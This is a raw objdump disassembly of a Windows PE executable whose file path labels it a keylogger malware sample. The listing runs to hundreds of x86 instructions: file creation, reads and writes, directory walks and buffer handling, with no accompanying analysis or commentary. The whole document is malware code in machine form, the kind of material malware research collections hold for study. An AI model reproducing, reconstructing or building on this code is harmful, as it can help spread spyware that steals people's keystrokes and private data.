
malware_samples/keylogger/4f6b732dfa5b4d91c56235f7c69974a4c557d6348f4ed9b862fa4938f7ce3848.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	d1 e8                	shr    $1,%eax
  401002:	b9 00 00 00 00       	mov    $0x0,%ecx
  401007:	74 07                	je     0x401010
  401009:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  40100e:	76 05                	jbe    0x401015
  401010:	b9 57 00 07 80       	mov    $0x80070057,%ecx
  401015:	85 c9                	test   %ecx,%ecx
  401017:	7c 40                	jl     0x401059
  401019:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40101d:	56                   	push   %esi
  40101e:	57                   	push   %edi
  40101f:	8d 70 ff             	lea    -0x1(%eax),%esi
  401022:	8d 44 24 10          	lea    0x10(%esp),%eax
  401026:	50                   	push   %eax
  401027:	51                   	push   %ecx
  401028:	56                   	push   %esi
  401029:	53                   	push   %ebx
  40102a:	33 ff                	xor    %edi,%edi
  40102c:	e8 27 4a 00 00       	call   0x405a58
  401031:	83 c4 10             	add    $0x10,%esp
  401034:	85 c0                	test   %eax,%eax
  401036:	7c 11                	jl     0x401049
  401038:	3b c6                	cmp    %esi,%eax
  40103a:	77 0d                	ja     0x401049
  40103c:	75 16                	jne    0x401054
  40103e:	33 d2                	xor    %edx,%edx
  401040:	8b c7                	mov    %edi,%eax
  401042:	5f                   	pop    %edi
  401043:	66 89 14 73          	mov    %dx,(%ebx,%esi,2)
  401047:	5e                   	pop    %esi
  401048:	c3                   	ret
  401049:	33 c0                	xor    %eax,%eax
  40104b:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  40104f:	bf 7a 00 07 80       	mov    $0x8007007a,%edi
  401054:	8b c7                	mov    %edi,%eax
  401056:	5f                   	pop    %edi
  401057:	5e                   	pop    %esi
  401058:	c3                   	ret
  401059:	8b c1                	mov    %ecx,%eax
  40105b:	c3                   	ret
  40105c:	cc                   	int3
  40105d:	cc                   	int3
  40105e:	cc                   	int3
  40105f:	cc                   	int3
  401060:	55                   	push   %ebp
  401061:	8b ec                	mov    %esp,%ebp
  401063:	83 e4 f8             	and    $0xfffffff8,%esp
  401066:	81 ec 20 08 00 00    	sub    $0x820,%esp
  40106c:	53                   	push   %ebx
  40106d:	55                   	push   %ebp
  40106e:	33 db                	xor    %ebx,%ebx
  401070:	83 c8 ff             	or     $0xffffffff,%eax
  401073:	56                   	push   %esi
  401074:	57                   	push   %edi
  401075:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  401079:	89 5c 24 24          	mov    %ebx,0x24(%esp)
  40107d:	c7 44 24 18 00 4c 3b 	movl   $0xfb3b4c00,0x18(%esp)
  401084:	fb 
  401085:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401089:	c7 44 24 28 80 0f 05 	movl   $0xfd050f80,0x28(%esp)
  401090:	fd 
  401091:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401095:	8d 44 24 24          	lea    0x24(%esp),%eax
  401099:	50                   	push   %eax
  40109a:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40109e:	51                   	push   %ecx
  40109f:	68 70 61 40 00       	push   $0x406170
  4010a4:	e8 97 42 00 00       	call   0x405340
  4010a9:	85 c0                	test   %eax,%eax
  4010ab:	7d 0f                	jge    0x4010bc
  4010ad:	8d 54 24 18          	lea    0x18(%esp),%edx
  4010b1:	52                   	push   %edx
  4010b2:	53                   	push   %ebx
  4010b3:	53                   	push   %ebx
  4010b4:	ff 15 a0 60 40 00    	call   *0x4060a0
  4010ba:	eb d9                	jmp    0x401095
  4010bc:	68 70 61 40 00       	push   $0x406170
  4010c1:	b8 c0 61 40 00       	mov    $0x4061c0,%eax
  4010c6:	e8 95 43 00 00       	call   0x405460
  4010cb:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4010cf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4010d2:	8d 75 0c             	lea    0xc(%ebp),%esi
  4010d5:	3b cb                	cmp    %ebx,%ecx
  4010d7:	0f 84 05 01 00 00    	je     0x4011e2
  4010dd:	b8 b3 42 8c 7d       	mov    $0x7d8c42b3,%eax
  4010e2:	f7 e1                	mul    %ecx
  4010e4:	8b fa                	mov    %edx,%edi
  4010e6:	c1 ef 09             	shr    $0x9,%edi
  4010e9:	8b c7                	mov    %edi,%eax
  4010eb:	69 c0 14 04 00 00    	imul   $0x414,%eax,%eax
  4010f1:	2b c8                	sub    %eax,%ecx
  4010f3:	0f 85 e9 00 00 00    	jne    0x4011e2
  4010f9:	38 1d 04 70 40 00    	cmp    %bl,0x407004
  4010ff:	74 2e                	je     0x40112f
  401101:	33 c0                	xor    %eax,%eax
  401103:	3b fb                	cmp    %ebx,%edi
  401105:	76 28                	jbe    0x40112f
  401107:	8b ce                	mov    %esi,%ecx
  401109:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  401110:	8b 11                	mov    (%ecx),%edx
  401112:	83 fa 03             	cmp    $0x3,%edx
  401115:	74 12                	je     0x401129
  401117:	83 fa 04             	cmp    $0x4,%edx
  40111a:	74 0d                	je     0x401129
  40111c:	40                   	inc    %eax
  40111d:	81 c1 14 04 00 00    	add    $0x414,%ecx
  401123:	3b c7                	cmp    %edi,%eax
  401125:	72 e9                	jb     0x401110
  401127:	eb 06                	jmp    0x40112f
  401129:	88 1d 04 70 40 00    	mov    %bl,0x407004
  40112f:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  401133:	51                   	push   %ecx
  401134:	53                   	push   %ebx
  401135:	53                   	push   %ebx
  401136:	ff 15 a0 60 40 00    	call   *0x4060a0
  40113c:	3b fb                	cmp    %ebx,%edi
  40113e:	0f 86 80 00 00 00    	jbe    0x4011c4
  401144:	83 c6 04             	add    $0x4,%esi
  401147:	8b 46 fc             	mov    -0x4(%esi),%eax
  40114a:	83 f8 01             	cmp    $0x1,%eax
  40114d:	75 3d                	jne    0x40118c
  40114f:	68 00 08 00 00       	push   $0x800
  401154:	8d 54 24 34          	lea    0x34(%esp),%edx
  401158:	53                   	push   %ebx
  401159:	52                   	push   %edx
  40115a:	e8 1d 49 00 00       	call   0x405a7c
  40115f:	83 c4 0c             	add    $0xc,%esp
  401162:	8d 86 08 02 00 00    	lea    0x208(%esi),%eax
  401168:	50                   	push   %eax
  401169:	56                   	push   %esi
  40116a:	68 f8 61 40 00       	push   $0x4061f8
  40116f:	b8 00 04 00 00       	mov    $0x400,%eax
  401174:	8d 5c 24 3c          	lea    0x3c(%esp),%ebx
  401178:	e8 83 fe ff ff       	call   0x401000
  40117d:	83 c4 0c             	add    $0xc,%esp
  401180:	8b cb                	mov    %ebx,%ecx
  401182:	51                   	push   %ecx
  401183:	e8 08 01 00 00       	call   0x401290
  401188:	33 db                	xor    %ebx,%ebx
  40118a:	eb 2d                	jmp    0x4011b9
  40118c:	83 f8 02             	cmp    $0x2,%eax
  40118f:	75 08                	jne    0x401199
  401191:	56                   	push   %esi
  401192:	e8 69 03 00 00       	call   0x401500
  401197:	eb 20                	jmp    0x4011b9
  401199:	83 f8 03             	cmp    $0x3,%eax
  40119c:	75 10                	jne    0x4011ae
  40119e:	8d 96 08 02 00 00    	lea    0x208(%esi),%edx
  4011a4:	52                   	push   %edx
  4011a5:	8b c6                	mov    %esi,%eax
  4011a7:	e8 b4 42 00 00       	call   0x405460
  4011ac:	eb 0b                	jmp    0x4011b9
  4011ae:	83 f8 04             	cmp    $0x4,%eax
  4011b1:	75 06                	jne    0x4011b9
  4011b3:	56                   	push   %esi
  4011b4:	e8 47 43 00 00       	call   0x405500
  4011b9:	81 c6 14 04 00 00    	add    $0x414,%esi
  4011bf:	83 ef 01             	sub    $0x1,%edi
  4011c2:	75 83                	jne    0x401147
  4011c4:	53                   	push   %ebx
  4011c5:	55                   	push   %ebp
  4011c6:	ff 15 28 61 40 00    	call   *0x406128
  4011cc:	8d 44 24 18          	lea    0x18(%esp),%eax
  4011d0:	50                   	push   %eax
  4011d1:	53                   	push   %ebx
  4011d2:	53                   	push   %ebx
  4011d3:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4011d7:	ff 15 a0 60 40 00    	call   *0x4060a0
  4011dd:	e9 b3 fe ff ff       	jmp    0x401095
  4011e2:	53                   	push   %ebx
  4011e3:	55                   	push   %ebp
  4011e4:	ff 15 28 61 40 00    	call   *0x406128
  4011ea:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4011ee:	51                   	push   %ecx
  4011ef:	53                   	push   %ebx
  4011f0:	53                   	push   %ebx
  4011f1:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4011f5:	ff 15 a0 60 40 00    	call   *0x4060a0
  4011fb:	e9 95 fe ff ff       	jmp    0x401095
  401200:	83 ec 14             	sub    $0x14,%esp
  401203:	53                   	push   %ebx
  401204:	56                   	push   %esi
  401205:	8b 70 14             	mov    0x14(%eax),%esi
  401208:	57                   	push   %edi
  401209:	8b 3d 18 60 40 00    	mov    0x406018,%edi
  40120f:	51                   	push   %ecx
  401210:	8d 54 24 14          	lea    0x14(%esp),%edx
  401214:	52                   	push   %edx
  401215:	8b de                	mov    %esi,%ebx
  401217:	ff d7                	call   *%edi
  401219:	8b 44 24 24          	mov    0x24(%esp),%eax
  40121d:	50                   	push   %eax
  40121e:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  401222:	51                   	push   %ecx
  401223:	ff d7                	call   *%edi
  401225:	8b 3d 1c 60 40 00    	mov    0x40601c,%edi
  40122b:	eb 03                	jmp    0x401230
  40122d:	8d 49 00             	lea    0x0(%ecx),%ecx
  401230:	83 7e 28 00          	cmpl   $0x0,0x28(%esi)
  401234:	74 17                	je     0x40124d
  401236:	83 7e 30 00          	cmpl   $0x0,0x30(%esi)
  40123a:	74 11                	je     0x40124d
  40123c:	6a 00                	push   $0x0
  40123e:	8d 54 24 14          	lea    0x14(%esp),%edx
  401242:	52                   	push   %edx
  401243:	8d 46 2c             	lea    0x2c(%esi),%eax
  401246:	50                   	push   %eax
  401247:	ff d7                	call   *%edi
  401249:	85 c0                	test   %eax,%eax
  40124b:	74 15                	je     0x401262
  40124d:	8b 76 04             	mov    0x4(%esi),%esi
  401250:	3b f3                	cmp    %ebx,%esi
  401252:	75 dc                	jne    0x401230
  401254:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
  401259:	5f                   	pop    %edi
  40125a:	5e                   	pop    %esi
  40125b:	5b                   	pop    %ebx
  40125c:	83 c4 14             	add    $0x14,%esp
  40125f:	c2 04 00             	ret    $0x4
  401262:	0f b7 4e 2e          	movzwl 0x2e(%esi),%ecx
  401266:	8b 56 30             	mov    0x30(%esi),%edx
  401269:	51                   	push   %ecx
  40126a:	6a 00                	push   $0x0
  40126c:	52                   	push   %edx
  40126d:	e8 0a 48 00 00       	call   0x405a7c
  401272:	0f b7 46 26          	movzwl 0x26(%esi),%eax
  401276:	8b 4e 28             	mov    0x28(%esi),%ecx
  401279:	50                   	push   %eax
  40127a:	6a 00                	push   $0x0
  40127c:	51                   	push   %ecx
  40127d:	e8 fa 47 00 00       	call   0x405a7c
  401282:	83 c4 18             	add    $0x18,%esp
  401285:	5f                   	pop    %edi
  401286:	5e                   	pop    %esi
  401287:	33 c0                	xor    %eax,%eax
  401289:	5b                   	pop    %ebx
  40128a:	83 c4 14             	add    $0x14,%esp
  40128d:	c2 04 00             	ret    $0x4
  401290:	81 ec a8 04 00 00    	sub    $0x4a8,%esp
  401296:	53                   	push   %ebx
  401297:	55                   	push   %ebp
  401298:	56                   	push   %esi
  401299:	57                   	push   %edi
  40129a:	33 ed                	xor    %ebp,%ebp
  40129c:	68 00 04 00 00       	push   $0x400
  4012a1:	8d 84 24 bc 00 00 00 	lea    0xbc(%esp),%eax
  4012a8:	55                   	push   %ebp
  4012a9:	50                   	push   %eax
  4012aa:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  4012ae:	e8 c9 47 00 00       	call   0x405a7c
  4012b3:	8b 8c 24 c8 04 00 00 	mov    0x4c8(%esp),%ecx
  4012ba:	83 c4 0c             	add    $0xc,%esp
  4012bd:	51                   	push   %ecx
  4012be:	8d 54 24 4c          	lea    0x4c(%esp),%edx
  4012c2:	52                   	push   %edx
  4012c3:	ff 15 18 60 40 00    	call   *0x406018
  4012c9:	68 00 40 20 00       	push   $0x204000
  4012ce:	6a 07                	push   $0x7
  4012d0:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  4012d4:	51                   	push   %ecx
  4012d5:	8d 54 24 3c          	lea    0x3c(%esp),%edx
  4012d9:	8d 44 24 54          	lea    0x54(%esp),%eax
  4012dd:	52                   	push   %edx
  4012de:	89 44 24 48          	mov    %eax,0x48(%esp)
  4012e2:	68 00 01 00 00       	push   $0x100
  4012e7:	8d 44 24 24          	lea    0x24(%esp),%eax
  4012eb:	50                   	push   %eax
  4012ec:	c7 44 24 48 18 00 00 	movl   $0x18,0x48(%esp)
  4012f3:	00 
  4012f4:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  4012f8:	c7 44 24 54 40 00 00 	movl   $0x40,0x54(%esp)
  4012ff:	00 
  401300:	89 6c 24 58          	mov    %ebp,0x58(%esp)
  401304:	89 6c 24 5c          	mov    %ebp,0x5c(%esp)
  401308:	ff 15 38 60 40 00    	call   *0x406038
  40130e:	85 c0                	test   %eax,%eax
  401310:	7c 55                	jl     0x401367
  401312:	33 c0                	xor    %eax,%eax
  401314:	6a 04                	push   $0x4
  401316:	6a 28                	push   $0x28
  401318:	8d 4c 24 58          	lea    0x58(%esp),%ecx
  40131c:	51                   	push   %ecx
  40131d:	8d 54 24 24          	lea    0x24(%esp),%edx
  401321:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  401325:	89 44 24 60          	mov    %eax,0x60(%esp)
  401329:	89 44 24 64          	mov    %eax,0x64(%esp)
  40132d:	89 44 24 68          	mov    %eax,0x68(%esp)
  401331:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  401335:	89 44 24 70          	mov    %eax,0x70(%esp)
  401339:	89 44 24 74          	mov    %eax,0x74(%esp)
  40133d:	89 44 24 78          	mov    %eax,0x78(%esp)
  401341:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401345:	52                   	push   %edx
  401346:	50                   	push   %eax
  401347:	c7 84 24 84 00 00 00 	movl   $0x80,0x84(%esp)
  40134e:	80 00 00 00 
  401352:	ff 15 24 60 40 00    	call   *0x406024
  401358:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40135c:	51                   	push   %ecx
  40135d:	ff 15 14 60 40 00    	call   *0x406014
  401363:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  401367:	55                   	push   %ebp
  401368:	55                   	push   %ebp
  401369:	6a 20                	push   $0x20
  40136b:	6a 01                	push   $0x1
  40136d:	6a 01                	push   $0x1
  40136f:	68 80 00 00 00       	push   $0x80
  401374:	55                   	push   %ebp
  401375:	8d 54 24 34          	lea    0x34(%esp),%edx
  401379:	52                   	push   %edx
  40137a:	8d 44 24 50          	lea    0x50(%esp),%eax
  40137e:	50                   	push   %eax
  40137f:	68 00 00 00 40       	push   $0x40000000
  401384:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401388:	51                   	push   %ecx
  401389:	ff 15 28 60 40 00    	call   *0x406028
  40138f:	8b f0                	mov    %eax,%esi
  401391:	3b f5                	cmp    %ebp,%esi
  401393:	0f 8c 3e 01 00 00    	jl     0x4014d7
  401399:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40139d:	8b 3d 3c 60 40 00    	mov    0x40603c,%edi
  4013a3:	6a 04                	push   $0x4
  4013a5:	6a 28                	push   $0x28
  4013a7:	8d 94 24 98 00 00 00 	lea    0x98(%esp),%edx
  4013ae:	52                   	push   %edx
  4013af:	8d 44 24 24          	lea    0x24(%esp),%eax
  4013b3:	50                   	push   %eax
  4013b4:	51                   	push   %ecx
  4013b5:	ff d7                	call   *%edi
  4013b7:	8b f0                	mov    %eax,%esi
  4013b9:	3b f5                	cmp    %ebp,%esi
  4013bb:	0f 8c 16 01 00 00    	jl     0x4014d7
  4013c1:	f6 84 24 b0 00 00 00 	testb  $0x10,0xb0(%esp)
  4013c8:	10 
  4013c9:	0f 85 de 00 00 00    	jne    0x4014ad
  4013cf:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4013d3:	6a 05                	push   $0x5
  4013d5:	6a 18                	push   $0x18
  4013d7:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  4013de:	52                   	push   %edx
  4013df:	8d 44 24 24          	lea    0x24(%esp),%eax
  4013e3:	50                   	push   %eax
  4013e4:	51                   	push   %ecx
  4013e5:	ff d7                	call   *%edi
  4013e7:	8b f0                	mov    %eax,%esi
  4013e9:	3b f5                	cmp    %ebp,%esi
  4013eb:	0f 8c e6 00 00 00    	jl     0x4014d7
  4013f1:	8b b4 24 84 00 00 00 	mov    0x84(%esp),%esi
  4013f8:	8b 9c 24 80 00 00 00 	mov    0x80(%esp),%ebx
  4013ff:	55                   	push   %ebp
  401400:	68 00 04 00 00       	push   $0x400
  401405:	56                   	push   %esi
  401406:	53                   	push   %ebx
  401407:	e8 82 46 00 00       	call   0x405a8e
  40140c:	55                   	push   %ebp
  40140d:	68 00 04 00 00       	push   $0x400
  401412:	56                   	push   %esi
  401413:	53                   	push   %ebx
  401414:	8b f8                	mov    %eax,%edi
  401416:	e8 6d 46 00 00       	call   0x405a88
  40141b:	8b c8                	mov    %eax,%ecx
  40141d:	33 db                	xor    %ebx,%ebx
  40141f:	3b fd                	cmp    %ebp,%edi
  401421:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  401425:	7e 4c                	jle    0x401473
  401427:	6a 00                	push   $0x0
  401429:	8b c5                	mov    %ebp,%eax
  40142b:	99                   	cltd
  40142c:	89 54 24 28          	mov    %edx,0x28(%esp)
  401430:	8d 54 24 24          	lea    0x24(%esp),%edx
  401434:	52                   	push   %edx
  401435:	8b 54 24 18          	mov    0x18(%esp),%edx
  401439:	68 00 04 00 00       	push   $0x400
  40143e:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401442:	8d 84 24 c4 00 00 00 	lea    0xc4(%esp),%eax
  401449:	50                   	push   %eax
  40144a:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  40144e:	51                   	push   %ecx
  40144f:	6a 00                	push   $0x0
  401451:	6a 00                	push   $0x0
  401453:	6a 00                	push   $0x0
  401455:	52                   	push   %edx
  401456:	ff 15 40 60 40 00    	call   *0x406040
  40145c:	8b f0                	mov    %eax,%esi
  40145e:	85 f6                	test   %esi,%esi
  401460:	7c 73                	jl     0x4014d5
  401462:	43                   	inc    %ebx
  401463:	81 c5 00 04 00 00    	add    $0x400,%ebp
  401469:	3b df                	cmp    %edi,%ebx
  40146b:	7c ba                	jl     0x401427
  40146d:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  401471:	33 ed                	xor    %ebp,%ebp
  401473:	3b cd                	cmp    %ebp,%ecx
  401475:	74 36                	je     0x4014ad
  401477:	8b c7                	mov    %edi,%eax
  401479:	c1 e0 0a             	shl    $0xa,%eax
  40147c:	99                   	cltd
  40147d:	55                   	push   %ebp
  40147e:	89 44 24 24          	mov    %eax,0x24(%esp)
  401482:	8d 44 24 24          	lea    0x24(%esp),%eax
  401486:	50                   	push   %eax
  401487:	8b 44 24 18          	mov    0x18(%esp),%eax
  40148b:	51                   	push   %ecx
  40148c:	8d 8c 24 c4 00 00 00 	lea    0xc4(%esp),%ecx
  401493:	51                   	push   %ecx
  401494:	89 54 24 34          	mov    %edx,0x34(%esp)
  401498:	8d 54 24 28          	lea    0x28(%esp),%edx
  40149c:	52                   	push   %edx
  40149d:	55                   	push   %ebp
  40149e:	55                   	push   %ebp
  40149f:	55                   	push   %ebp
  4014a0:	50                   	push   %eax
  4014a1:	ff 15 40 60 40 00    	call   *0x406040
  4014a7:	8b f0                	mov    %eax,%esi
  4014a9:	3b f5                	cmp    %ebp,%esi
  4014ab:	7c 2a                	jl     0x4014d7
  4014ad:	8b 44 24 10          	mov    0x10(%esp),%eax
  4014b1:	6a 0d                	push   $0xd
  4014b3:	6a 01                	push   $0x1
  4014b5:	8d 4c 24 1f          	lea    0x1f(%esp),%ecx
  4014b9:	51                   	push   %ecx
  4014ba:	8d 54 24 24          	lea    0x24(%esp),%edx
  4014be:	52                   	push   %edx
  4014bf:	50                   	push   %eax
  4014c0:	c6 44 24 2b 01       	movb   $0x1,0x2b(%esp)
  4014c5:	ff 15 24 60 40 00    	call   *0x406024
  4014cb:	8b f0                	mov    %eax,%esi
  4014cd:	3b f5                	cmp    %ebp,%esi
  4014cf:	7c 06                	jl     0x4014d7
  4014d1:	33 f6                	xor    %esi,%esi
  4014d3:	eb 02                	jmp    0x4014d7
  4014d5:	33 ed                	xor    %ebp,%ebp
  4014d7:	8b 44 24 10          	mov    0x10(%esp),%eax
  4014db:	3b c5                	cmp    %ebp,%eax
  4014dd:	74 07                	je     0x4014e6
  4014df:	50                   	push   %eax
  4014e0:	ff 15 14 60 40 00    	call   *0x406014
  4014e6:	5f                   	pop    %edi
  4014e7:	8b c6                	mov    %esi,%eax
  4014e9:	5e                   	pop    %esi
  4014ea:	5d                   	pop    %ebp
  4014eb:	5b                   	pop    %ebx
  4014ec:	81 c4 a8 04 00 00    	add    $0x4a8,%esp
  4014f2:	c2 04 00             	ret    $0x4
  4014f5:	cc                   	int3
  4014f6:	cc                   	int3
  4014f7:	cc                   	int3
  4014f8:	cc                   	int3
  4014f9:	cc                   	int3
  4014fa:	cc                   	int3
  4014fb:	cc                   	int3
  4014fc:	cc                   	int3
  4014fd:	cc                   	int3
  4014fe:	cc                   	int3
  4014ff:	cc                   	int3
  401500:	81 ec 70 02 00 00    	sub    $0x270,%esp
  401506:	8b 84 24 74 02 00 00 	mov    0x274(%esp),%eax
  40150d:	53                   	push   %ebx
  40150e:	55                   	push   %ebp
  40150f:	56                   	push   %esi
  401510:	57                   	push   %edi
  401511:	50                   	push   %eax
  401512:	8d 4c 24 74          	lea    0x74(%esp),%ecx
  401516:	33 db                	xor    %ebx,%ebx
  401518:	51                   	push   %ecx
  401519:	be 01 00 00 c0       	mov    $0xc0000001,%esi
  40151e:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  401522:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401526:	ff 15 18 60 40 00    	call   *0x406018
  40152c:	8b 3d 2c 60 40 00    	mov    0x40602c,%edi
  401532:	68 d0 97 01 00       	push   $0x197d0
  401537:	8d 54 24 74          	lea    0x74(%esp),%edx
  40153b:	53                   	push   %ebx
  40153c:	c7 44 24 38 18 00 00 	movl   $0x18,0x38(%esp)
  401543:	00 
  401544:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  401548:	c7 44 24 44 40 00 00 	movl   $0x40,0x44(%esp)
  40154f:	00 
  401550:	89 54 24 40          	mov    %edx,0x40(%esp)
  401554:	89 5c 24 48          	mov    %ebx,0x48(%esp)
  401558:	89 5c 24 4c          	mov    %ebx,0x4c(%esp)
  40155c:	ff d7                	call   *%edi
  40155e:	8b e8                	mov    %eax,%ebp
  401560:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  401564:	3b eb                	cmp    %ebx,%ebp
  401566:	0f 84 9c 02 00 00    	je     0x401808
  40156c:	68 d0 97 01 00       	push   $0x197d0
  401571:	53                   	push   %ebx
  401572:	55                   	push   %ebp
  401573:	e8 04 45 00 00       	call   0x405a7c
  401578:	83 c4 0c             	add    $0xc,%esp
  40157b:	68 00 40 20 00       	push   $0x204000
  401580:	6a 07                	push   $0x7
  401582:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401586:	50                   	push   %eax
  401587:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  40158b:	51                   	push   %ecx
  40158c:	68 00 01 00 00       	push   $0x100
  401591:	8d 54 24 28          	lea    0x28(%esp),%edx
  401595:	52                   	push   %edx
  401596:	ff 15 38 60 40 00    	call   *0x406038
  40159c:	85 c0                	test   %eax,%eax
  40159e:	7c 52                	jl     0x4015f2
  4015a0:	8b 54 24 14          	mov    0x14(%esp),%edx
  4015a4:	33 c0                	xor    %eax,%eax
  4015a6:	6a 04                	push   $0x4
  4015a8:	6a 28                	push   $0x28
  4015aa:	89 44 24 50          	mov    %eax,0x50(%esp)
  4015ae:	89 44 24 54          	mov    %eax,0x54(%esp)
  4015b2:	89 44 24 58          	mov    %eax,0x58(%esp)
  4015b6:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  4015ba:	89 44 24 60          	mov    %eax,0x60(%esp)
  4015be:	89 44 24 64          	mov    %eax,0x64(%esp)
  4015c2:	89 44 24 68          	mov    %eax,0x68(%esp)
  4015c6:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  4015ca:	8d 44 24 50          	lea    0x50(%esp),%eax
  4015ce:	50                   	push   %eax
  4015cf:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  4015d3:	51                   	push   %ecx
  4015d4:	52                   	push   %edx
  4015d5:	c7 44 24 7c 80 00 00 	movl   $0x80,0x7c(%esp)
  4015dc:	00 
  4015dd:	ff 15 24 60 40 00    	call   *0x406024
  4015e3:	8b 44 24 14          	mov    0x14(%esp),%eax
  4015e7:	50                   	push   %eax
  4015e8:	ff 15 14 60 40 00    	call   *0x406014
  4015ee:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4015f2:	53                   	push   %ebx
  4015f3:	53                   	push   %ebx
  4015f4:	6a 20                	push   $0x20
  4015f6:	6a 01                	push   $0x1
  4015f8:	6a 01                	push   $0x1
  4015fa:	68 80 00 00 00       	push   $0x80
  4015ff:	53                   	push   %ebx
  401600:	8d 4c 24 40          	lea    0x40(%esp),%ecx
  401604:	51                   	push   %ecx
  401605:	8d 54 24 50          	lea    0x50(%esp),%edx
  401609:	52                   	push   %edx
  40160a:	68 00 00 00 40       	push   $0x40000000
  40160f:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  401613:	50                   	push   %eax
  401614:	ff 15 28 60 40 00    	call   *0x406028
  40161a:	8b f0                	mov    %eax,%esi
  40161c:	3b f3                	cmp    %ebx,%esi
  40161e:	0f 8c e4 01 00 00    	jl     0x401808
  401624:	68 00 10 00 00       	push   $0x1000
  401629:	53                   	push   %ebx
  40162a:	ff d7                	call   *%edi
  40162c:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  401630:	3b c3                	cmp    %ebx,%eax
  401632:	75 0a                	jne    0x40163e
  401634:	be a0 00 00 c0       	mov    $0xc00000a0,%esi
  401639:	e9 ca 01 00 00       	jmp    0x401808
  40163e:	8b 54 24 14          	mov    0x14(%esp),%edx
  401642:	53                   	push   %ebx
  401643:	53                   	push   %ebx
  401644:	53                   	push   %ebx
  401645:	6a 01                	push   $0x1
  401647:	68 00 10 00 00       	push   $0x1000
  40164c:	50                   	push   %eax
  40164d:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  401651:	51                   	push   %ecx
  401652:	53                   	push   %ebx
  401653:	53                   	push   %ebx
  401654:	53                   	push   %ebx
  401655:	52                   	push   %edx
  401656:	8b e8                	mov    %eax,%ebp
  401658:	ff 15 30 60 40 00    	call   *0x406030
  40165e:	85 c0                	test   %eax,%eax
  401660:	0f 8c 54 01 00 00    	jl     0x4017ba
  401666:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  40166a:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40166e:	33 c0                	xor    %eax,%eax
  401670:	69 c9 14 04 00 00    	imul   $0x414,%ecx,%ecx
  401676:	8d 4c 11 04          	lea    0x4(%ecx,%edx,1),%ecx
  40167a:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  40167e:	8b ff                	mov    %edi,%edi
  401680:	03 e8                	add    %eax,%ebp
  401682:	0f b7 45 3c          	movzwl 0x3c(%ebp),%eax
  401686:	83 e8 02             	sub    $0x2,%eax
  401689:	8d 5d 40             	lea    0x40(%ebp),%ebx
  40168c:	74 0c                	je     0x40169a
  40168e:	83 e8 02             	sub    $0x2,%eax
  401691:	75 11                	jne    0x4016a4
  401693:	66 83 7b 02 2e       	cmpw   $0x2e,0x2(%ebx)
  401698:	75 0a                	jne    0x4016a4
  40169a:	66 83 3b 2e          	cmpw   $0x2e,(%ebx)
  40169e:	0f 84 df 00 00 00    	je     0x401783
  4016a4:	8b bc 24 84 02 00 00 	mov    0x284(%esp),%edi
  4016ab:	8b c7                	mov    %edi,%eax
  4016ad:	8d 50 02             	lea    0x2(%eax),%edx
  4016b0:	66 8b 08             	mov    (%eax),%cx
  4016b3:	83 c0 02             	add    $0x2,%eax
  4016b6:	66 85 c9             	test   %cx,%cx
  4016b9:	75 f5                	jne    0x4016b0
  4016bb:	8b 75 3c             	mov    0x3c(%ebp),%esi
  4016be:	2b c2                	sub    %edx,%eax
  4016c0:	d1 f8                	sar    $1,%eax
  4016c2:	d1 ee                	shr    $1,%esi
  4016c4:	8d 54 06 01          	lea    0x1(%esi,%eax,1),%edx
  4016c8:	81 fa 04 01 00 00    	cmp    $0x104,%edx
  4016ce:	0f 83 af 00 00 00    	jae    0x401783
  4016d4:	68 08 02 00 00       	push   $0x208
  4016d9:	8d 44 24 7c          	lea    0x7c(%esp),%eax
  4016dd:	6a 00                	push   $0x0
  4016df:	50                   	push   %eax
  4016e0:	e8 97 43 00 00       	call   0x405a7c
  4016e5:	8d 94 24 84 00 00 00 	lea    0x84(%esp),%edx
  4016ec:	83 c4 0c             	add    $0xc,%esp
  4016ef:	8b c7                	mov    %edi,%eax
  4016f1:	2b d7                	sub    %edi,%edx
  4016f3:	0f b7 08             	movzwl (%eax),%ecx
  4016f6:	66 89 0c 02          	mov    %cx,(%edx,%eax,1)
